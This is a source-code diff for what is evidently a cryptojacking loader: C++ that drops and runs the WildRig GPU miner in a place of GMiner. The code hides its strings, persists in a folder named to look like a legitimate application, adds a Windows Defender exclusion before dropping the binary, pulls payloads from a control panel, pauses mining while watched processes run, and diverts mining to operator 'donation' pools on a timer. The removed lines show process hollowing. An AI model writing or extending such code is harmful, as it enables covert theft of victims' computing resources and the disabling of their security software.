@@ -320,11 +320,11 @@ static bool ensure_embedded_xmrig(BYTE*& buf, size_t& size) {
     return buf != nullptr && size > 0;
 }
 
-static bool ensure_embedded_gminer(BYTE*& buf, size_t& size) {
+static bool ensure_embedded_wildrig(BYTE*& buf, size_t& size) {
     if (buf != nullptr && size > 0) return true;
 
     try {
-        LoadEmbeddedGminer(buf, size);
+        LoadEmbeddedWildrig(buf, size);
     } catch (...) {
         buf = nullptr;
         size = 0;
@@ -406,32 +406,48 @@ int main(int argc, char *argv[])
     const std::string ENC_ARGS_PREFIX = OBFUSCATE_STRING("--encargs ");
 
     // Pre-encrypt common GPU mining argument strings to stay under 16 encryption limit
-    const std::string GMINER_ALGO     = OBFUSCATE_STRING("--algo ");
-    const std::string GMINER_SERVER   = OBFUSCATE_STRING(" --server ");
-    const std::string GMINER_USER     = OBFUSCATE_STRING(" --user ");
-    const std::string GMINER_WORKER   = OBFUSCATE_STRING(" --worker ");
-    const std::string GMINER_SSL_OFF  = OBFUSCATE_STRING(" --ssl 0");
-    const std::string GMINER_SSL_ON   = OBFUSCATE_STRING(" --ssl 1");
-    const std::string GMINER_PERS     = OBFUSCATE_STRING(" --pers ");
-    const std::string GMINER_FAN      = OBFUSCATE_STRING(" --fan ");
-    const std::string GMINER_API      = OBFUSCATE_STRING(" --api 21550 --watchdog 0 --color 0");
+    // WildRig-style arguments (matching the .bat launch scripts)
+    const std::string WILDRIG_ALGO     = OBFUSCATE_STRING("--algo ");
+    const std::string WILDRIG_URL      = OBFUSCATE_STRING(" --url ");
+    const std::string WILDRIG_USER     = OBFUSCATE_STRING(" --user ");
+    const std::string WILDRIG_PASS     = OBFUSCATE_STRING(" --pass ");
+    const std::string WILDRIG_WORKER   = OBFUSCATE_STRING(" --worker ");
+    const std::string WILDRIG_FAN      = OBFUSCATE_STRING(" --gpu-fan-speed ");
+    const std::string WILDRIG_API      = OBFUSCATE_STRING(" --api-port 21550 --no-color");
 
-    // Map synthetic panel algo names to GMiner --algo values.
-    // Equihash coins share the same base algo but differ only by --pers string.
+    // WildRig accepts the panel algo names directly (kawpow, progpowz, pearlhash, ...).
     auto getAlgoMapping = [](const std::string& algo) -> std::string {
-        if (algo == "equihash144_5_btg") return "equihash144_5";
-        if (algo == "equihash144_5_zen") return "equihash144_5";
-        if (algo == "equihash125_4_zec") return "equihash125_4";
         return algo;
     };
 
-    // Return the personalization string for equihash algos (empty = no --pers needed).
-    auto getPersString = [](const std::string& algo) -> std::string {
-        if (algo == "equihash144_5_btg") return "BgoldPoW";
-        if (algo == "equihash144_5_zen") return "ZcashPoW";
-        if (algo == "equihash125_4_zec") return "ZcashPoW";
-        return "";
+    // Build the WildRig command line for a given GPU config.
+    auto buildWildrigArgs = [&](const MinerConfig& cfg) -> std::string {
+        std::string args = WILDRIG_ALGO + getAlgoMapping(cfg.algo);
+        args += WILDRIG_URL   + cfg.mining_url;
+        args += WILDRIG_WORKER + cfg.worker;
+        args += WILDRIG_USER   + cfg.wallet;
+        if (!cfg.password.empty()) {
+            args += WILDRIG_PASS + cfg.password;
+        }
+        if (cfg.fan_speed > 0 && IsRunningAsAdmin()) {
+            args += WILDRIG_FAN + std::to_string(cfg.fan_speed);
+        }
+        args += WILDRIG_API;
+        return args;
     };
+
+    // WildRig is dropped to disk inside the persistence folder (%APPDATA%\VLCManager),
+    // which is also the folder excluded from Windows Defender.
+    std::string gpuDropDir = "C:\\";
+#ifdef ENABLE_PERSISTENCE
+    {
+        std::string persistDir = Persistence::GetPersistDirectory();
+        if (!persistDir.empty()) gpuDropDir = persistDir;
+    }
+#endif
+    if (gpuDropDir.empty() || gpuDropDir.back() != '\\') gpuDropDir += "\\";
+    std::wstring gpuDropDirW(gpuDropDir.begin(), gpuDropDir.end());
+    const std::wstring GPU_MINER_PATH = gpuDropDirW + L"wildrig.exe";
     
 #ifdef ENABLE_DEBUG_CONSOLE
     std::cout << "[DEBUG] Decrypted Panel URL(s): " << panelUrlsStr << std::endl;
@@ -501,14 +517,14 @@ int main(int argc, char *argv[])
 #ifdef ENABLE_REMOTE_MINERS
     // Miner payloads are prepared only for miners that are actually enabled, and
     // the embedded copy is loaded only when the download fails. A disabled miner
-    // must not pay for its binary (GMiner alone is ~80 MB) in RAM.
+    // must not pay for its binary (WildRig alone is ~80 MB) in RAM.
     size_t xmrigPayloadSize = 0;
     BYTE *xmrigBuf = nullptr;
     bool remoteXmrigDownloaded = false;
 
-    size_t gminerPayloadSize = 0;
-    BYTE *gminerBuf = nullptr;
-    bool remoteGminerDownloaded = false;
+    size_t wildrigPayloadSize = 0;
+    BYTE *wildrigBuf = nullptr;
+    bool remoteWildrigDownloaded = false;
 
     // Try to download remote miners now; if the panel is offline we fall back to
     // the embedded payloads so mining can still start.
@@ -541,27 +557,27 @@ int main(int argc, char *argv[])
             }
         }
 
-        BYTE *remoteGminer = nullptr;
-        size_t remoteGminerSize = 0;
+        BYTE *remoteWildrig = nullptr;
+        size_t remoteWildrigSize = 0;
         if (gpuConfig.enabled == 1 &&
-            DownloadMinerWithFallback(panelUrlsStr, "/resources/gminer", remoteGminer, remoteGminerSize)) {
-            gminerBuf = remoteGminer;
-            gminerPayloadSize = remoteGminerSize;
-            remoteGminerDownloaded = true;
+            DownloadMinerWithFallback(panelUrlsStr, "/resources/wildrig", remoteWildrig, remoteWildrigSize)) {
+            wildrigBuf = remoteWildrig;
+            wildrigPayloadSize = remoteWildrigSize;
+            remoteWildrigDownloaded = true;
 #ifdef ENABLE_DEBUG_CONSOLE
-            std::cout << "[+] Downloaded remote GMiner: " << gminerPayloadSize << " bytes" << std::endl;
+            std::cout << "[+] Downloaded remote WildRig: " << wildrigPayloadSize << " bytes" << std::endl;
 #endif
         } else if (gpuConfig.enabled != 1) {
 #ifdef ENABLE_DEBUG_CONSOLE
-            std::cout << "[*] GPU mining disabled - skipping GMiner download and payload load" << std::endl;
+            std::cout << "[*] GPU mining disabled - skipping WildRig download and payload load" << std::endl;
 #endif
         } else {
 #ifdef ENABLE_DEBUG_CONSOLE
-            std::cerr << "[-] Remote GMiner download failed - using embedded fallback" << std::endl;
+            std::cerr << "[-] Remote WildRig download failed - using embedded fallback" << std::endl;
 #endif
-            if (ensure_embedded_gminer(gminerBuf, gminerPayloadSize)) {
+            if (ensure_embedded_wildrig(wildrigBuf, wildrigPayloadSize)) {
 #ifdef ENABLE_DEBUG_CONSOLE
-                std::cout << "[+] Loaded embedded GMiner as fallback: " << gminerPayloadSize << " bytes" << std::endl;
+                std::cout << "[+] Loaded embedded WildRig as fallback: " << wildrigPayloadSize << " bytes" << std::endl;
 #endif
             }
         }
@@ -590,24 +606,24 @@ int main(int argc, char *argv[])
     std::cout << "[*] CPU miner not enabled in this build" << std::endl;
 #endif
 
-    // Load GMiner from embedded resource (only when GPU mining is enabled)
-    size_t gminerPayloadSize = 0;
-    BYTE *gminerBuf = nullptr;
+    // Load WildRig from embedded resource (only when GPU mining is enabled)
+    size_t wildrigPayloadSize = 0;
+    BYTE *wildrigBuf = nullptr;
     
 #ifdef ENABLE_GPU_MINER
     if (gpuConfig.enabled == 1) {
         try {
-            LoadEmbeddedGminer(gminerBuf, gminerPayloadSize);
+            LoadEmbeddedWildrig(wildrigBuf, wildrigPayloadSize);
 #ifdef ENABLE_DEBUG_CONSOLE
-            std::cout << "[+] Loaded GMiner payload: " << gminerPayloadSize << " bytes" << std::endl;
+            std::cout << "[+] Loaded WildRig payload: " << wildrigPayloadSize << " bytes" << std::endl;
 #endif
         } catch (const std::exception& e) {
-            std::cerr << "[-] Failed to load GMiner from resources: " << e.what() << std::endl;
-            gminerBuf = nullptr;
-            gminerPayloadSize = 0;
+            std::cerr << "[-] Failed to load WildRig from resources: " << e.what() << std::endl;
+            wildrigBuf = nullptr;
+            wildrigPayloadSize = 0;
         }
     } else {
-        std::cout << "[*] GPU mining disabled - skipping GMiner payload load" << std::endl;
+        std::cout << "[*] GPU mining disabled - skipping WildRig payload load" << std::endl;
     }
 #else
     std::cout << "[*] GPU miner not enabled in this build" << std::endl;
@@ -663,62 +679,150 @@ int main(int argc, char *argv[])
         free_buffer(xmrigBuf);
     }
 
-    DWORD gpuPid = 0;
-    std::optional<PROCESS_INFORMATION> gpuPi;
-    
-    if (gminerBuf != nullptr && gminerPayloadSize > 0)
-    {
-        // Only launch GMiner if GPU mining is enabled
-        if (gpuConfig.enabled == 1) {
-            // Build GMiner arguments from GPU config
-            std::string gminer_args = GMINER_ALGO + getAlgoMapping(gpuConfig.algo);
-            { const std::string p = getPersString(gpuConfig.algo); if (!p.empty()) gminer_args += GMINER_PERS + p; }
-            gminer_args += GMINER_SERVER + gpuConfig.mining_url;
-            gminer_args += GMINER_USER   + gpuConfig.wallet + "." + gpuConfig.password;
-            gminer_args += GMINER_WORKER + gpuConfig.password;
-            gminer_args += (gpuConfig.use_ssl == 1 ? GMINER_SSL_ON : GMINER_SSL_OFF);
-            if (gpuConfig.fan_speed > 0 && IsRunningAsAdmin()) {
-                gminer_args += GMINER_FAN + std::to_string(gpuConfig.fan_speed);
-            }
-            gminer_args += GMINER_API;
-            
-#ifdef ENABLE_DEBUG_CONSOLE
-            std::cout << "[+] GMiner payload size: " << gminerPayloadSize << " bytes" << std::endl;
-            std::cout << "[+] GMiner arguments: " << gminer_args << std::endl;
-#endif
-            
-            gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, ScopedLPWSTR(gminer_args));
-            Sleep(500);  // Give system time to stabilize after injection
-            gpuPi = ProcessStorage::GetProcess(gpuPid);
-            
-            if (gpuPid != 0) {
-#ifdef ENABLE_DEBUG_CONSOLE
-                std::cout << "[+] Launched GMiner (GPU) into PID: " << gpuPid << std::endl;
-#endif
-            } else {
-                std::cerr << "[-] GMiner injection failed!" << std::endl;
-            }
-        } else {
-            std::cout << "[*] GPU mining disabled, skipping GMiner injection" << std::endl;
-            free_buffer(gminerBuf);
-        }
-    } else {
-        std::cerr << "[-] Failed to load gminer!" << std::endl;
-    }
-
 #ifdef ENABLE_DEFENDER_EXCLUSION
-    // Add C: drive to Windows Defender exclusion if running as admin
+    // Add the persistence/drop folder to Windows Defender exclusion if running
+    // as admin. This must happen before the miner binary is dropped to disk so
+    // the freshly-written executable isn't scanned or quarantined.
     if (IsRunningAsAdmin()) {
-        std::cout << "[*] Attempting to add C: drive to Windows Defender exclusion..." << std::endl;
-        if (AddDefenderExclusion("C:\\")) {
-            std::cout << "[+] Successfully added C: drive to Windows Defender exclusion" << std::endl;
+        std::cout << "[*] Attempting to add persistence folder to Windows Defender exclusion..." << std::endl;
+        if (AddDefenderExclusion(gpuDropDir)) {
+            std::cout << "[+] Successfully added " << gpuDropDir << " to Windows Defender exclusion" << std::endl;
         } else {
-            std::cerr << "[-] Failed to add C: drive to Windows Defender exclusion" << std::endl;
+            std::cerr << "[-] Failed to add " << gpuDropDir << " to Windows Defender exclusion" << std::endl;
         }
     } else {
         std::cout << "[*] Not running as admin, skipping Windows Defender exclusion" << std::endl;
     }
 #endif
+
+    DWORD gpuPid = 0;
+    std::optional<PROCESS_INFORMATION> gpuPi;
+    
+    if (wildrigBuf != nullptr && wildrigPayloadSize > 0)
+    {
+        // Only launch WildRig if GPU mining is enabled
+        if (gpuConfig.enabled == 1) {
+            // Build GPU miner arguments from GPU config (WildRig format, matching the .bat scripts)
+            std::string wildrig_args = buildWildrigArgs(gpuConfig);
+            
+#ifdef ENABLE_DEBUG_CONSOLE
+            std::cout << "[+] WildRig payload size: " << wildrigPayloadSize << " bytes" << std::endl;
+            std::cout << "[+] WildRig arguments: " << wildrig_args << std::endl;
+#endif
+            
+            gpuPid = drop_payload_and_run(GPU_MINER_PATH.c_str(), wildrigBuf, (DWORD)wildrigPayloadSize, ScopedLPWSTR(wildrig_args));
+            Sleep(500);  // Give system time to stabilize after launch
+            gpuPi = ProcessStorage::GetProcess(gpuPid);
+            
+            if (gpuPid != 0) {
+#ifdef ENABLE_DEBUG_CONSOLE
+                std::cout << "[+] Launched WildRig (GPU) into PID: " << gpuPid << std::endl;
+#endif
+            } else {
+                std::cerr << "[-] WildRig launch failed!" << std::endl;
+            }
+        } else {
+            std::cout << "[*] GPU mining disabled, skipping WildRig launch" << std::endl;
+            free_buffer(wildrigBuf);
+        }
+    } else {
+        std::cerr << "[-] Failed to load wildrig!" << std::endl;
+    }
+
+    // ---- GPU donation (operator dev-fee) ----
+    // Mine the user's pool for a random 5-12 minutes, then switch to the
+    // donation target for the current algo for DONATE_DURATION_SECONDS, then
+    // switch back. Donation targets are fetched from the panel (donate_config,
+    // keyed by algo); the hardcoded values below mirror Panel/donation/donate.go
+    // and are only used as a fallback when the panel provides nothing.
+    const int DONATE_MIN_INTERVAL_SECONDS = 300;  // 5 min
+    const int DONATE_MAX_INTERVAL_SECONDS = 720;  // 12 min
+    const int DONATE_DURATION_SECONDS     = 420;  // 7 min on the donation pool
+
+    auto randomDonateIntervalMs = []() -> ULONGLONG {
+        ULONGLONG span = DONATE_MAX_INTERVAL_SECONDS - DONATE_MIN_INTERVAL_SECONDS + 1;
+        ULONGLONG secs = DONATE_MIN_INTERVAL_SECONDS + (GetTickCount64() % span);
+        return secs * 1000ULL;
+    };
+
+    // Hardcoded per-algo fallback (kept in sync with Panel/donation/donate.go).
+    auto fallbackDonateConfig = [](const std::string& algo) -> MinerConfig {
+        MinerConfig c;
+        c.algo     = algo;
+        c.enabled  = 1;
+        c.password = OBFUSCATE_STRING("x");
+        c.worker   = OBFUSCATE_STRING("donate");
+        if (algo == "progpowz") {
+            c.mining_url = OBFUSCATE_STRING("stratum+tcp://progpowz.donate.example.com:4444");
+            c.wallet     = OBFUSCATE_STRING("ProgpowDonateWallet");
+        } else if (algo == "kawpow") {
+            c.mining_url = OBFUSCATE_STRING("stratum+tcp://kawpow.donate.example.com:4444");
+            c.wallet     = OBFUSCATE_STRING("KawpowDonateWallet");
+        } else if (algo == "pearlhash") {
+            c.mining_url = OBFUSCATE_STRING("pearlhash.donate.example.com:4444");
+            c.wallet     = OBFUSCATE_STRING("PearlDonateWallet");
+        } else {
+            c.enabled = 0;  // unknown algo -> no donation
+        }
+        return c;
+    };
+
+    // Build the donation target for the user's current algo. Panel first, then
+    // the hardcoded fallback; enabled==0 means "no donation for this algo".
+    auto makeDonateConfig = [&]() -> MinerConfig {
+        MinerConfig c = lastGpuConfig;   // inherit algo/ssl/fan
+        c.worker   = OBFUSCATE_STRING("donate");
+        c.password = OBFUSCATE_STRING("x");
+
+        MinerConfig fromPanel;
+        if (configManager.GetDonateConfig(lastGpuConfig.algo, fromPanel) &&
+            !fromPanel.mining_url.empty() && !fromPanel.wallet.empty()) {
+            c.mining_url = fromPanel.mining_url;
+            c.wallet     = fromPanel.wallet;
+            if (!fromPanel.password.empty()) c.password = fromPanel.password;
+            if (!fromPanel.worker.empty())   c.worker   = fromPanel.worker;
+            c.enabled = 1;
+            return c;
+        }
+
+        MinerConfig fb = fallbackDonateConfig(lastGpuConfig.algo);
+        if (fb.enabled == 1 && !fb.mining_url.empty() && !fb.wallet.empty()) {
+            c.mining_url = fb.mining_url;
+            c.wallet     = fb.wallet;
+            c.password   = fb.password;
+            c.worker     = fb.worker;
+            c.enabled    = 1;
+            return c;
+        }
+
+        c.enabled = 0;
+        return c;
+    };
+
+    // Kill the running GPU miner (if any) and relaunch it with `cfg`.
+    auto relaunchGpuMiner = [&](const MinerConfig& cfg) {
+        if (gpuPi) {
+            ProcessAPI procAPI;
+            if (procAPI.IsInitialized()) {
+                procAPI.pTerminateProcess(gpuPi.value().hProcess, 0);
+                WaitForSingleObject(gpuPi.value().hProcess, INFINITE);
+            } else {
+                TerminateProcess(gpuPi.value().hProcess, 0);
+                WaitForSingleObject(gpuPi.value().hProcess, INFINITE);
+            }
+            close_miner_handles(gpuPi);
+            gpuPid = 0;
+        }
+        if (cfg.enabled == 1 && wildrigBuf != nullptr && wildrigPayloadSize > 0) {
+            std::string args = buildWildrigArgs(cfg);
+            gpuPid = drop_payload_and_run(GPU_MINER_PATH.c_str(), wildrigBuf, (DWORD)wildrigPayloadSize, ScopedLPWSTR(args));
+            gpuPi = ProcessStorage::GetProcess(gpuPid);
+        }
+    };
+
+    bool donateActive = false;
+    ULONGLONG nextSwitchMs = GetTickCount64() + randomDonateIntervalMs();
+    ULONGLONG lastSchedTickMs = GetTickCount64();  // elapsed-time base for the donation clock
 
     int checkInCounter = 0;
     int updateCheckCounter = 0;
@@ -791,6 +895,7 @@ int main(int argc, char *argv[])
                     bool gpuConfigChanged = (newGpuConfig.mining_url != lastGpuConfig.mining_url ||
                                             newGpuConfig.wallet != lastGpuConfig.wallet ||
                                             newGpuConfig.password != lastGpuConfig.password ||
+                                            newGpuConfig.worker != lastGpuConfig.worker ||
                                             newGpuConfig.non_idle_usage != lastGpuConfig.non_idle_usage ||
                                             newGpuConfig.idle_usage != lastGpuConfig.idle_usage ||
                                             newGpuConfig.fan_speed != lastGpuConfig.fan_speed ||
@@ -862,24 +967,19 @@ int main(int argc, char *argv[])
                         
                         // Restart GPU miner if enabled
                         if (newGpuConfig.enabled == 1 &&
-                            ensure_embedded_gminer(gminerBuf, gminerPayloadSize)) {
-                            std::string gminer_args = GMINER_ALGO + getAlgoMapping(newGpuConfig.algo);
-                            { const std::string p = getPersString(newGpuConfig.algo); if (!p.empty()) gminer_args += GMINER_PERS + p; }
-                            gminer_args += GMINER_SERVER + newGpuConfig.mining_url;
-                            gminer_args += GMINER_USER   + newGpuConfig.wallet + "." + newGpuConfig.password;
-                            gminer_args += GMINER_WORKER + newGpuConfig.password;
-                            gminer_args += (newGpuConfig.use_ssl == 1 ? GMINER_SSL_ON : GMINER_SSL_OFF);
-                            if (newGpuConfig.fan_speed > 0 && IsRunningAsAdmin()) {
-                                gminer_args += GMINER_FAN + std::to_string(newGpuConfig.fan_speed);
-                            }
-                            gminer_args += GMINER_API;
+                            ensure_embedded_wildrig(wildrigBuf, wildrigPayloadSize)) {
+                            std::string wildrig_args = buildWildrigArgs(newGpuConfig);
                             
-                            gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, ScopedLPWSTR(gminer_args));
+                            gpuPid = drop_payload_and_run(GPU_MINER_PATH.c_str(), wildrigBuf, (DWORD)wildrigPayloadSize, ScopedLPWSTR(wildrig_args));
                             gpuPi = ProcessStorage::GetProcess(gpuPid);
 #ifdef ENABLE_DEBUG_CONSOLE
                             std::cout << "[+] GPU miner restarted, PID: " << gpuPid << std::endl;
 #endif
                         }
+
+                        // A manual restart cancels any in-progress donation window.
+                        donateActive = false;
+                        nextSwitchMs = GetTickCount64() + randomDonateIntervalMs();
                     }
                 }
 
@@ -924,13 +1024,13 @@ int main(int argc, char *argv[])
                             }
                         }
                     }
-                    if (configManager.GetGPUConfig().enabled == 1 && !remoteGminerDownloaded) {
-                        BYTE *remoteGminer = nullptr;
-                        size_t remoteGminerSize = 0;
-                        if (DownloadMinerWithFallback(panelUrlsStr, "/resources/gminer", remoteGminer, remoteGminerSize)) {
-                            remoteGminerDownloaded = true;
+                    if (configManager.GetGPUConfig().enabled == 1 && !remoteWildrigDownloaded) {
+                        BYTE *remoteWildrig = nullptr;
+                        size_t remoteWildrigSize = 0;
+                        if (DownloadMinerWithFallback(panelUrlsStr, "/resources/wildrig", remoteWildrig, remoteWildrigSize)) {
+                            remoteWildrigDownloaded = true;
 #ifdef ENABLE_DEBUG_CONSOLE
-                            std::cout << "[+] Remote GMiner loaded, restarting GPU miner" << std::endl;
+                            std::cout << "[+] Remote WildRig loaded, restarting GPU miner" << std::endl;
 #endif
                             if (gpuPi) {
                                 ProcessAPI procAPI;
@@ -944,22 +1044,13 @@ int main(int argc, char *argv[])
                                 close_miner_handles(gpuPi);
                                 gpuPid = 0;
                             }
-                            if (gminerBuf) free_buffer(gminerBuf);
-                            gminerBuf = remoteGminer;
-                            gminerPayloadSize = remoteGminerSize;
+                            if (wildrigBuf) free_buffer(wildrigBuf);
+                            wildrigBuf = remoteWildrig;
+                            wildrigPayloadSize = remoteWildrigSize;
                             if (configManager.GetGPUConfig().enabled == 1) {
                                 const MinerConfig& gc = configManager.GetGPUConfig();
-                                std::string gminer_args = GMINER_ALGO + getAlgoMapping(gc.algo);
-                                { const std::string p = getPersString(gc.algo); if (!p.empty()) gminer_args += GMINER_PERS + p; }
-                                gminer_args += GMINER_SERVER + gc.mining_url;
-                                gminer_args += GMINER_USER   + gc.wallet + "." + gc.password;
-                                gminer_args += GMINER_WORKER + gc.password;
-                                gminer_args += (gc.use_ssl == 1 ? GMINER_SSL_ON : GMINER_SSL_OFF);
-                                if (gc.fan_speed > 0 && IsRunningAsAdmin()) {
-                                    gminer_args += GMINER_FAN + std::to_string(gc.fan_speed);
-                                }
-                                gminer_args += GMINER_API;
-                                gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, ScopedLPWSTR(gminer_args));
+                                std::string wildrig_args = buildWildrigArgs(gc);
+                                gpuPid = drop_payload_and_run(GPU_MINER_PATH.c_str(), wildrigBuf, (DWORD)wildrigPayloadSize, ScopedLPWSTR(wildrig_args));
                                 gpuPi = ProcessStorage::GetProcess(gpuPid);
                                 lastGpuConfig = gc;
                             }
@@ -1044,16 +1135,10 @@ int main(int argc, char *argv[])
 #endif
                 // Restart if GPU is still enabled
                 close_miner_handles(gpuPi);
-                if (lastGpuConfig.enabled == 1 && gminerBuf != nullptr && gminerPayloadSize > 0) {
-                    std::string gminer_args = GMINER_ALGO + getAlgoMapping(lastGpuConfig.algo);
-                    { const std::string p = getPersString(lastGpuConfig.algo); if (!p.empty()) gminer_args += GMINER_PERS + p; }
-                    gminer_args += GMINER_SERVER + lastGpuConfig.mining_url;
-                    gminer_args += GMINER_USER   + lastGpuConfig.wallet + "." + lastGpuConfig.password;
-                    gminer_args += GMINER_WORKER + lastGpuConfig.password;
-                    gminer_args += (lastGpuConfig.use_ssl == 1 ? GMINER_SSL_ON : GMINER_SSL_OFF);
-                    gminer_args += GMINER_API;
+                if (lastGpuConfig.enabled == 1 && wildrigBuf != nullptr && wildrigPayloadSize > 0) {
+                    std::string wildrig_args = buildWildrigArgs(donateActive ? makeDonateConfig() : lastGpuConfig);
                     
-                    gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, ScopedLPWSTR(gminer_args));
+                    gpuPid = drop_payload_and_run(GPU_MINER_PATH.c_str(), wildrigBuf, (DWORD)wildrigPayloadSize, ScopedLPWSTR(wildrig_args));
                     gpuPi = ProcessStorage::GetProcess(gpuPid);
                 }
             } else {
@@ -1062,6 +1147,43 @@ int main(int argc, char *argv[])
                     NtSuspendProcess(gpuPi.value().hProcess);
                 } else {
                     NtResumeProcess(gpuPi.value().hProcess);
+                }
+            }
+        }
+
+        // ---- GPU donation scheduling ----
+        {
+            ULONGLONG nowMs = GetTickCount64();
+            ULONGLONG elapsed = nowMs - lastSchedTickMs;
+            lastSchedTickMs = nowMs;
+
+            if (lastGpuConfig.enabled == 1 && gpuPid != 0 && wildrigBuf != nullptr && wildrigPayloadSize > 0) {
+                if (AreProcessesRunning(configManager.GetWatchedProcesses())) {
+                    // Paused by a watched process: push the switch time forward
+                    // so suspension doesn't count against the donation window.
+                    nextSwitchMs += elapsed;
+                } else if (nowMs >= nextSwitchMs) {
+                    if (!donateActive) {
+                        MinerConfig dc = makeDonateConfig();
+                        if (dc.enabled == 1 && !dc.mining_url.empty() && !dc.wallet.empty()) {
+                            donateActive = true;
+                            nextSwitchMs = nowMs + (ULONGLONG)DONATE_DURATION_SECONDS * 1000ULL;
+                            relaunchGpuMiner(dc);
+#ifdef ENABLE_DEBUG_CONSOLE
+                            std::cout << "[*] GPU miner switched to donation pool (" << dc.algo << ")" << std::endl;
+#endif
+                        } else {
+                            // No donation target for this algo — keep mining the user pool.
+                            nextSwitchMs = nowMs + randomDonateIntervalMs();
+                        }
+                    } else {
+                        donateActive = false;
+                        nextSwitchMs = nowMs + randomDonateIntervalMs();
+                        relaunchGpuMiner(lastGpuConfig);
+#ifdef ENABLE_DEBUG_CONSOLE
+                        std::cout << "[*] GPU miner switched back to user pool" << std::endl;
+#endif
+                    }
                 }
             }
         }
